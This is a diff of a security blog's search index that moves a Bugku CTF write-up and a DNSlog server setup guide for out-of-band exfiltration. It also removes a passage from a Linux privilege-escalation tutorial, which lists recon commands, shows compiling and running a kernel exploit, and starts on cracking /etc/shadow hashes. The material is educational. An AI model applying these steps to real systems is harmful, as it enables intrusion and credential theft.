@@ -516,48 +516,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Bugku-Web-变量1</title>
-    <url>/post/55589c6e.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、考察方向"><a href="#一、考察方向" class="headerlink" title="一、考察方向"></a>一、考察方向</h1><ul>
-<li>PHP的<code>$GLOBALS</code></li>
-<li>正则表达式</li>
-</ul>
-<h1 id="二、PHP预备知识——-GLOBALS"><a href="#二、PHP预备知识——-GLOBALS" class="headerlink" title="二、PHP预备知识——$GLOBALS"></a>二、PHP预备知识——$GLOBALS</h1><p>&emsp;&emsp;其中提示flag在变量中 “flag In the variable !” ，这里要普及一个PHP中特殊的变量</p>
-<p>&emsp;&emsp;<strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
-<p>&emsp;&emsp;<strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
-<p>&emsp;&emsp;<strong>示例：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#结果</span><br><span class="line">$foo in global scope: Example content</span><br><span class="line">$foo in current scope: local variable</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;注意：</p>
-<ul>
-<li> “Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
-<li> <strong>变量可用性</strong>。与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。</li>
-</ul>
-<h1 id="三、代码分析"><a href="#三、代码分析" class="headerlink" title="三、代码分析"></a>三、代码分析</h1><p>&emsp;&emsp;页面如下</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="image.png"></p>
-<p>&emsp;&emsp;其中正则表达式<code>/^\w+$/</code>，意思是只能有字母和数字</p>
-<ul>
-<li>两个//表示开始和结束</li>
-<li>^表示开始字符串</li>
-<li>$表示结束字符串</li>
-<li>\w表示包含【a-z，A-Z, _ , 0-9】</li>
-<li>+表示一个或者多个\w</li>
-<li>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </li>
-</ul>
-<h1 id="四、解题"><a href="#四、解题" class="headerlink" title="四、解题"></a>四、解题</h1><p>&emsp;&emsp;访问<a href="http://114.67.246.176:12610/?args=GLOBALS">http://114.67.246.176:12610/?args=GLOBALS</a>，看到flag</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="image.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CORS跨域漏洞与JSONP劫持</title>
     <url>/post/c8aa67d0.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前几天逛B站刷到个视频，UP主利用酷某音乐软件存在JSONP劫持漏洞获取了骗子绑定的手机号，于是我便搜集了些网上的资料对JSONP的相关知识点进行一个系统的学习，原视频如下</p>
@@ -831,6 +789,48 @@
       </tags>
   </entry>
   <entry>
+    <title>Bugku-Web-变量1</title>
+    <url>/post/55589c6e.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、考察方向"><a href="#一、考察方向" class="headerlink" title="一、考察方向"></a>一、考察方向</h1><ul>
+<li>PHP的<code>$GLOBALS</code></li>
+<li>正则表达式</li>
+</ul>
+<h1 id="二、PHP预备知识——-GLOBALS"><a href="#二、PHP预备知识——-GLOBALS" class="headerlink" title="二、PHP预备知识——$GLOBALS"></a>二、PHP预备知识——$GLOBALS</h1><p>&emsp;&emsp;其中提示flag在变量中 “flag In the variable !” ，这里要普及一个PHP中特殊的变量</p>
+<p>&emsp;&emsp;<strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
+<p>&emsp;&emsp;<strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
+<p>&emsp;&emsp;<strong>示例：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#结果</span><br><span class="line">$foo in global scope: Example content</span><br><span class="line">$foo in current scope: local variable</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;注意：</p>
+<ul>
+<li> “Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
+<li> <strong>变量可用性</strong>。与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。</li>
+</ul>
+<h1 id="三、代码分析"><a href="#三、代码分析" class="headerlink" title="三、代码分析"></a>三、代码分析</h1><p>&emsp;&emsp;页面如下</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="image.png"></p>
+<p>&emsp;&emsp;其中正则表达式<code>/^\w+$/</code>，意思是只能有字母和数字</p>
+<ul>
+<li>两个//表示开始和结束</li>
+<li>^表示开始字符串</li>
+<li>$表示结束字符串</li>
+<li>\w表示包含【a-z，A-Z, _ , 0-9】</li>
+<li>+表示一个或者多个\w</li>
+<li>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </li>
+</ul>
+<h1 id="四、解题"><a href="#四、解题" class="headerlink" title="四、解题"></a>四、解题</h1><p>&emsp;&emsp;访问<a href="http://114.67.246.176:12610/?args=GLOBALS">http://114.67.246.176:12610/?args=GLOBALS</a>，看到flag</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CSRF跨站请求伪造攻击</title>
     <url>/post/ecd34c17.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CSRF介绍"><a href="#一、CSRF介绍" class="headerlink" title="一、CSRF介绍"></a>一、CSRF介绍</h1><p>&emsp;&emsp;CSRF全称为跨站请求伪造（Cross-site request forgery），是一种网络攻击方式，也被称为 one-click attack 或者 session riding。通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像xss漏洞，但是它与xss漏洞非常不同。xss利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。与xss攻击相比，csrf攻击往往不大流行，也难以防范，所以认为比xss漏洞更具危险性</p>
@@ -1024,93 +1024,6 @@
       <tags>
         <tag>CVE</tag>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DNSlog平台的搭建</title>
-    <url>/post/54d8f8e4.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、DNSlog简介"><a href="#一、DNSlog简介" class="headerlink" title="一、DNSlog简介"></a>一、DNSlog简介</h1><p>在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS log方式将想获得的数据外带出来（oob）。</p>
-<p>DNS log常用于以下情况：</p>
-<ul>
-<li>SQL盲注</li>
-<li>无回显的命令执行</li>
-<li>无回显的SSRF</li>
-</ul>
-<h1 id="二、搭建DNS-log平台"><a href="#二、搭建DNS-log平台" class="headerlink" title="二、搭建DNS log平台"></a>二、搭建DNS log平台</h1><h2 id="1、前期准备"><a href="#1、前期准备" class="headerlink" title="1、前期准备"></a>1、前期准备</h2><p>一台VPS</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.x.x.x</span><br></pre></td></tr></table></figure>
-
-<p>一个域名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wolke.cn</span><br></pre></td></tr></table></figure>
-
-<p>在wolke.cn中添加添加一个A记录与一个NS记录。其中A记录指向服务器IP地址，NS记录指向A记录的域名地址</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562613907-c9d1e7a7-0335-4785-a270-e1759156cc0c.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562881191-ad3d59d6-aae1-4866-b9fa-7108a2afa188.png" alt="img"></p>
-<h2 id="2、项目部署"><a href="#2、项目部署" class="headerlink" title="2、项目部署"></a>2、项目部署</h2><p>参考开源项目DNSlog-GO：<a href="https://github.com/lanyi1998/DNSlog-GO">https://github.com/lanyi1998/DNSlog-GO</a></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557026089-4305fe46-3c10-4169-8fe7-0dcf9cf3f6ee.png" alt="img"></p>
-<ol>
-<li>该项目是由GO语言编写的,所以部署的时候需要用到GO语言的环境</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557546342-a6ff2d8a-eabb-42c2-8782-a0b41c694fa6.png" alt="img"></p>
-<ol start="2">
-<li>DNS使用的是53（UDP）端口，记得53端口的放行</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557785213-0185e0dd-d69e-4901-83c9-d0e2a2b6898e.png" alt="img"></p>
-<ol start="3">
-<li>配置文件config.yaml的修改（我这里HTTP采用的是8000端口，也记得要放行）</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563048509-991cf600-f74a-4b75-b040-df7ca5262abe.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562901833-45d9ccd8-a0c5-499b-a06e-38070446ce29.png" alt="img"></p>
-<ol start="4">
-<li>启动</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563107321-afeeb64a-aae8-43ef-b2a1-ff447ac72ec2.png" alt="img"></p>
-<h2 id="3、测试"><a href="#3、测试" class="headerlink" title="3、测试"></a>3、测试</h2><p>访问<a href="http://ip:8000/">http://ip:8000</a></p>
-<p>需要输入token，这里的token就是config.yaml设置的值</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563363392-7cfa047a-ad31-4022-bb1e-dbf85df8197f.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563433917-7ab15738-c93b-417a-8e2f-72b3c89740eb.png" alt="img"></p>
-<p>点击复制随机子域名获取到 8xek8.dnslog.wolke.cn  </p>
-<p>使用ping命令</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563128680-4d239280-469e-4454-8ac3-99477b39b830.png" alt="img"></p>
-<p>可以看到回显结果</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562914728-90fe294f-1d04-43e9-9d66-e54f6c044b5a.png" alt="img"></p>
-<h1 id="三、后台运行并加入开机自启动"><a href="#三、后台运行并加入开机自启动" class="headerlink" title="三、后台运行并加入开机自启动"></a>三、后台运行并加入开机自启动</h1><p>上面的方法有两个不足</p>
-<ul>
-<li>无法后台运行</li>
-<li>重启后进程不复存在</li>
-</ul>
-<p>经过一个多小时的排错和搜索资料，终于实现了开机自启动并后台运行。这里我详细地写下教程，免得大家像我一样出现很多错误耽误时间。</p>
-<h2 id="1、编写Shell脚本"><a href="#1、编写Shell脚本" class="headerlink" title="1、编写Shell脚本"></a>1、编写Shell脚本</h2><p>在/root/DNSlog目录下编写run.sh，内容如下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root/DNSlog  # 这里根据自己DNSlog的main可执行文件所在位置进行修改即可</span><br><span class="line">./main &amp;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>之后执行run.sh这个脚本，此时进程虽然会输出到当前终端会话，但其实进程已经脱离了当前会话，可以安全的推出会话，进程也不会退出。</p>
-</blockquote>
-<h2 id="2、修改rc-local"><a href="#2、修改rc-local" class="headerlink" title="2、修改rc.local"></a>2、修改rc.local</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
-
-<p>在末尾加上这句</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/DNSlog/run.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220712033650679.png" alt="image-20220712033650679"></p>
-<p>给rc.local加上可执行权限</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
-
-<h2 id="3、修改rc-local服务"><a href="#3、修改rc-local服务" class="headerlink" title="3、修改rc-local服务"></a>3、修改rc-local服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status rc-local.service <span class="comment"># 检查rc-local服务是否开启</span></span><br><span class="line">systemctl start rc-local.service  <span class="comment"># 开启rc-local服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rc-local.service <span class="comment"># 将rc-local服务加入开机自启动</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p>重启vps后，使用<code>ps -ef</code>可以发现已经自动运行了该程序，后台进程ID为1146</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657567000515-ee6504bc-cb0c-4422-b2df-9c2c33415a98.png" alt="img"></p>
-<p>Web服务也能成功访问</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657567063255-69fdad6b-1358-4f22-92e4-b3473542ec07.png" alt="img"></p>
-<blockquote>
-<p> 杀死进程可以使用命令 <code>kill -9 进程PID</code></p>
-</blockquote>
-<h2 id="5、最后"><a href="#5、最后" class="headerlink" title="5、最后"></a>5、最后</h2><p>到这里我们就实现了只要VPS处于开机状态，main程序就自动运行，<strong>常开随用</strong>，我们可以方便快捷地使用DNSlog。但<strong>常开随用</strong>也带来了一个问题就是，如果某个攻击者获得了我们的Token（社工或爆破等手段），那么攻击者就可能会使用我们的VPS主机开启的DNSlog服务去进行一些非法渗透，而如果被溯源到就会很麻烦，因此我们需要提高Token的复杂度且避免泄露，或者不使用这节的技术，使用原始的<strong>随开随用</strong>方法，什么时候需要用DNSlog就什么时候运行main程序，很大程度上可以避免这个问题。</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>DNSlog</tag>
       </tags>
   </entry>
   <entry>
@@ -1636,6 +1549,93 @@
       </tags>
   </entry>
   <entry>
+    <title>DNSlog平台的搭建</title>
+    <url>/post/54d8f8e4.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、DNSlog简介"><a href="#一、DNSlog简介" class="headerlink" title="一、DNSlog简介"></a>一、DNSlog简介</h1><p>在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS log方式将想获得的数据外带出来（oob）。</p>
+<p>DNS log常用于以下情况：</p>
+<ul>
+<li>SQL盲注</li>
+<li>无回显的命令执行</li>
+<li>无回显的SSRF</li>
+</ul>
+<h1 id="二、搭建DNS-log平台"><a href="#二、搭建DNS-log平台" class="headerlink" title="二、搭建DNS log平台"></a>二、搭建DNS log平台</h1><h2 id="1、前期准备"><a href="#1、前期准备" class="headerlink" title="1、前期准备"></a>1、前期准备</h2><p>一台VPS</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.x.x.x</span><br></pre></td></tr></table></figure>
+
+<p>一个域名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wolke.cn</span><br></pre></td></tr></table></figure>
+
+<p>在wolke.cn中添加添加一个A记录与一个NS记录。其中A记录指向服务器IP地址，NS记录指向A记录的域名地址</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562613907-c9d1e7a7-0335-4785-a270-e1759156cc0c.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562881191-ad3d59d6-aae1-4866-b9fa-7108a2afa188.png" alt="img"></p>
+<h2 id="2、项目部署"><a href="#2、项目部署" class="headerlink" title="2、项目部署"></a>2、项目部署</h2><p>参考开源项目DNSlog-GO：<a href="https://github.com/lanyi1998/DNSlog-GO">https://github.com/lanyi1998/DNSlog-GO</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557026089-4305fe46-3c10-4169-8fe7-0dcf9cf3f6ee.png" alt="img"></p>
+<ol>
+<li>该项目是由GO语言编写的,所以部署的时候需要用到GO语言的环境</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557546342-a6ff2d8a-eabb-42c2-8782-a0b41c694fa6.png" alt="img"></p>
+<ol start="2">
+<li>DNS使用的是53（UDP）端口，记得53端口的放行</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657557785213-0185e0dd-d69e-4901-83c9-d0e2a2b6898e.png" alt="img"></p>
+<ol start="3">
+<li>配置文件config.yaml的修改（我这里HTTP采用的是8000端口，也记得要放行）</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563048509-991cf600-f74a-4b75-b040-df7ca5262abe.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562901833-45d9ccd8-a0c5-499b-a06e-38070446ce29.png" alt="img"></p>
+<ol start="4">
+<li>启动</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563107321-afeeb64a-aae8-43ef-b2a1-ff447ac72ec2.png" alt="img"></p>
+<h2 id="3、测试"><a href="#3、测试" class="headerlink" title="3、测试"></a>3、测试</h2><p>访问<a href="http://ip:8000/">http://ip:8000</a></p>
+<p>需要输入token，这里的token就是config.yaml设置的值</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563363392-7cfa047a-ad31-4022-bb1e-dbf85df8197f.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563433917-7ab15738-c93b-417a-8e2f-72b3c89740eb.png" alt="img"></p>
+<p>点击复制随机子域名获取到 8xek8.dnslog.wolke.cn  </p>
+<p>使用ping命令</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657563128680-4d239280-469e-4454-8ac3-99477b39b830.png" alt="img"></p>
+<p>可以看到回显结果</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657562914728-90fe294f-1d04-43e9-9d66-e54f6c044b5a.png" alt="img"></p>
+<h1 id="三、后台运行并加入开机自启动"><a href="#三、后台运行并加入开机自启动" class="headerlink" title="三、后台运行并加入开机自启动"></a>三、后台运行并加入开机自启动</h1><p>上面的方法有两个不足</p>
+<ul>
+<li>无法后台运行</li>
+<li>重启后进程不复存在</li>
+</ul>
+<p>经过一个多小时的排错和搜索资料，终于实现了开机自启动并后台运行。这里我详细地写下教程，免得大家像我一样出现很多错误耽误时间。</p>
+<h2 id="1、编写Shell脚本"><a href="#1、编写Shell脚本" class="headerlink" title="1、编写Shell脚本"></a>1、编写Shell脚本</h2><p>在/root/DNSlog目录下编写run.sh，内容如下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root/DNSlog  # 这里根据自己DNSlog的main可执行文件所在位置进行修改即可</span><br><span class="line">./main &amp;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>之后执行run.sh这个脚本，此时进程虽然会输出到当前终端会话，但其实进程已经脱离了当前会话，可以安全的推出会话，进程也不会退出。</p>
+</blockquote>
+<h2 id="2、修改rc-local"><a href="#2、修改rc-local" class="headerlink" title="2、修改rc.local"></a>2、修改rc.local</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
+
+<p>在末尾加上这句</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/DNSlog/run.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220712033650679.png" alt="image-20220712033650679"></p>
+<p>给rc.local加上可执行权限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、修改rc-local服务"><a href="#3、修改rc-local服务" class="headerlink" title="3、修改rc-local服务"></a>3、修改rc-local服务</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status rc-local.service <span class="comment"># 检查rc-local服务是否开启</span></span><br><span class="line">systemctl start rc-local.service  <span class="comment"># 开启rc-local服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rc-local.service <span class="comment"># 将rc-local服务加入开机自启动</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p>重启vps后，使用<code>ps -ef</code>可以发现已经自动运行了该程序，后台进程ID为1146</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657567000515-ee6504bc-cb0c-4422-b2df-9c2c33415a98.png" alt="img"></p>
+<p>Web服务也能成功访问</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657567063255-69fdad6b-1358-4f22-92e4-b3473542ec07.png" alt="img"></p>
+<blockquote>
+<p> 杀死进程可以使用命令 <code>kill -9 进程PID</code></p>
+</blockquote>
+<h2 id="5、最后"><a href="#5、最后" class="headerlink" title="5、最后"></a>5、最后</h2><p>到这里我们就实现了只要VPS处于开机状态，main程序就自动运行，<strong>常开随用</strong>，我们可以方便快捷地使用DNSlog。但<strong>常开随用</strong>也带来了一个问题就是，如果某个攻击者获得了我们的Token（社工或爆破等手段），那么攻击者就可能会使用我们的VPS主机开启的DNSlog服务去进行一些非法渗透，而如果被溯源到就会很麻烦，因此我们需要提高Token的复杂度且避免泄露，或者不使用这节的技术，使用原始的<strong>随开随用</strong>方法，什么时候需要用DNSlog就什么时候运行main程序，很大程度上可以避免这个问题。</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>DNSlog</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker概述</title>
     <url>/post/fb618b33.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker为什么会出现"><a href="#一、Docker为什么会出现" class="headerlink" title="一、Docker为什么会出现"></a>一、Docker为什么会出现</h1><p>&emsp;&emsp;一款产品：开发👉上线 经常需要两套环境！需要对其进行部署应用环境和应用配置。那么就有了开发人员和运维人员</p>
@@ -2007,77 +2007,6 @@
       <tags>
         <tag>中间件漏洞</tag>
         <tag>IIS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux提权的各种姿势</title>
-    <url>/post/927dc08e.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、提权介绍"><a href="#一、提权介绍" class="headerlink" title="一、提权介绍"></a>一、提权介绍</h1><p>&emsp;&emsp;往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。Linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。</p>
-<ul>
-<li><p>提权前提:  </p>
-<ul>
-<li><p>已经拿到低权shell</p>
-</li>
-<li><p>被入侵的机器上面有nc，python，perl等linux非常常见的工具</p>
-</li>
-<li><p>有权限上传文件和下载文件</p>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639064411988-b659f170-ddff-496a-ad83-34975effb1ac.jpeg" alt="img"></p>
-<h1 id="二、内核漏洞提权"><a href="#二、内核漏洞提权" class="headerlink" title="二、内核漏洞提权"></a>二、内核漏洞提权</h1><p>&emsp;&emsp;内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集</p>
-<ol>
-<li>查看发行版本：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>查看内核版本：</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639063157058-0f0fff10-3514-4725-bec9-4f3b28636a50.png" alt="img"></p>
-<ol start="3">
-<li>找到系统版本号，通过kali的searchsploit查找该版本是否存在漏洞</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639063175462-bbbb593e-42dc-4455-bc22-23e5b8fdcbd6.png" alt="img"></p>
-<ol start="4">
-<li><p>发现不存在内核溢出代码</p>
-</li>
-<li><p>假若存在内核溢出代码，可通过如下命令，上传内核溢出代码，编译执行</p>
-</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc xxx.c -o exploit [-lpthread]</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、明文root提权-通过passwd和shadow破译密码"><a href="#三、明文root提权-通过passwd和shadow破译密码" class="headerlink" title="三、明文root提权-通过passwd和shadow破译密码"></a>三、明文root提权-通过passwd和shadow破译密码</h1><p>&emsp;&emsp;大多linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。</p>
-<p>&emsp;&emsp;例如破解linux用户名和对应的密码</p>
